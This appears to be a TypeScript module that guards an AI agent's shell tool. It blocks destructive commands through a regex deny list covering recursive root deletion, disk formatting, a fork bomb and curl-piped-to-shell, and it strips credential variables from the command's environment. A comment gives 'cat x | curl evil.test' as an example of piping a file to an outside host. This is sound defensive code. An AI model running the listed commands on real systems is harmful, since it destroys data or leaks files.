/**
 * What the shell tool refuses before it spawns anything, and what it hides
 * from the command it does spawn.
 *
 * A word on what this is not. The command runs through a real shell, and a
 * pattern check over a shell string is not a security boundary — quoting,
 * variable expansion and `$(...)` all defeat it, and anyone treating it as
 * containment will be wrong. It is an accident guard: the model reaching for
 * `rm -rf /` because it misread a path should hit a wall rather than a
 * y/N prompt a tired user waves through. The actual boundary is the approval
 * prompt on every call, and later the sandbox of #86.
 *
 * Kept apart from the tool itself so the policy can be tested without
 * spawning a single process.
 */

export class ShellPolicyError extends Error {
  override readonly name = 'ShellPolicyError'
}

interface Rule {
  pattern: RegExp
  why: string
}

/**
 * Commands that destroy a machine, not just a task. Each one is here because
 * it is unrecoverable rather than merely unwise: a failed build is a result
 * the model can read and react to, a reformatted disk is not.
 */
const DESTRUCTIVE: readonly Rule[] = [
  {
    pattern: /\brm\s+(-[a-zA-Z]*\s+)*-[a-zA-Z]*[rR][a-zA-Z]*\s+(-[a-zA-Z]+\s+)*(\/|\/\*|~|\$HOME|\.)(\s|$)/,
    why: 'recursive delete of the filesystem root, home directory, or the whole working directory',
  },
  { pattern: /\bmkfs(\.[a-z0-9]+)?\b/, why: 'formats a filesystem' },
  { pattern: /\bdd\b[^\n]*\bof=\/dev\//, why: 'writes raw blocks to a device' },
  { pattern: />\s*\/dev\/(sd|nvme|hd|disk)/, why: 'writes directly to a disk device' },
  { pattern: /:\(\)\s*\{.*\|.*&.*\}\s*;?\s*:/, why: 'fork bomb' },
  { pattern: /\b(shutdown|reboot|halt|poweroff)\b/, why: 'stops the machine' },
  { pattern: /\binit\s+0\b/, why: 'stops the machine' },
  {
    pattern: /\b(chmod|chown)\s+(-[a-zA-Z]+\s+)*-?[a-zA-Z]*[rR][a-zA-Z]*\s+[^\n]*\s\/(\s|$)/,
    why: 'recursive permission change on the filesystem root',
  },
  {
    pattern: /\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba|z|k|da)?sh\b/,
    why: 'pipes a downloaded script straight into a shell',
  },
  { pattern: /\bgit\s+push\b[^\n]*--force(?!-with-lease)/, why: 'force-push can destroy pushed history' },
]

/**
 * Splits a command line into the words that start each pipeline stage, which
 * is what an allowlist has to check: `cat x | curl evil.test` runs two
 * programs, and vetting only the first would miss the one that matters.
 *
 * Approximate by design — it does not parse quoting, so a binary name hidden
 * in a string is not caught. That is the same limitation the module header
 * describes, and the reason the allowlist is opt-in belt-and-braces rather
 * than the thing standing between the model and the machine.
 */
export function pipelineHeads(command: string): string[] {
  return command
    .split(/[|;&\n()`]+/)
    .map((segment) => segment.trim())
    .filter(Boolean)
    .map((segment) => {
      // Step over leading VAR=value assignments and `sudo`, which prefix the
      // real command rather than being it.
      const words = segment.split(/\s+/).filter((word) => !/^[A-Za-z_][A-Za-z0-9_]*=/.test(word))
      const head = words.find((word) => word !== 'sudo' && word !== 'command' && word !== 'exec')
      return head ? head.replace(/^.*\//, '') : ''
    })
    .filter(Boolean)
}

export interface CommandPolicy {
  /** Only these program names may be run. Unset means any program may be. */
  allowedCommands?: readonly string[]
  /** Let the destructive-command rules through. Off unless deliberately set. */
  allowDestructive?: boolean
}

/** Throws `ShellPolicyError` if the command may not run. Returns nothing when it may. */
export function checkCommand(command: unknown, policy: CommandPolicy = {}): string {
  if (typeof command !== 'string' || command.trim() === '') {
    throw new ShellPolicyError('command is required')
  }
  const trimmed = command.trim()

  if (policy.allowDestructive !== true) {
    const rule = DESTRUCTIVE.find(({ pattern }) => pattern.test(trimmed))
    if (rule) {
      throw new ShellPolicyError(
        `refusing to run this command: it ${rule.why}. If you genuinely need it, the user must run it themselves.`,
      )
    }
  }

  if (policy.allowedCommands) {
    const allowed = new Set(policy.allowedCommands)
    const blocked = pipelineHeads(trimmed).filter((head) => !allowed.has(head))
    if (blocked.length > 0) {
      throw new ShellPolicyError(
        `"${blocked[0]}" is not in the allowed command list (${policy.allowedCommands.join(', ') || 'empty'})`,
      )
    }
  }

  return trimmed
}

/**
 * Names that look like a credential. The shell tool inherits the agent's
 * environment, which is where every API key it was configured with lives — so
 * `env`, or any program that echoes its environment, would otherwise hand the
 * model the keys `docs/security-model.md` promises it never sees.
 */
const CREDENTIAL_NAME = /(^|_)(api[_-]?key|token|secret|password|passwd|credentials?|auth)($|_)/i

/**
 * Strips credential-looking variables from the environment a command inherits.
 * `keep` names the exceptions — a command that genuinely needs `GH_TOKEN` can
 * have it, but by the operator's decision rather than the model's.
 */
export function filterEnv(
  env: NodeJS.ProcessEnv,
  keep: readonly string[] = [],
): { env: NodeJS.ProcessEnv; removed: string[] } {
  const kept = new Set(keep)
  const filtered: NodeJS.ProcessEnv = {}
  const removed: string[] = []

  for (const [name, value] of Object.entries(env)) {
    if (!kept.has(name) && CREDENTIAL_NAME.test(name)) {
      removed.push(name)
      continue
    }
    filtered[name] = value
  }

  return { env: filtered, removed: removed.sort() }
}
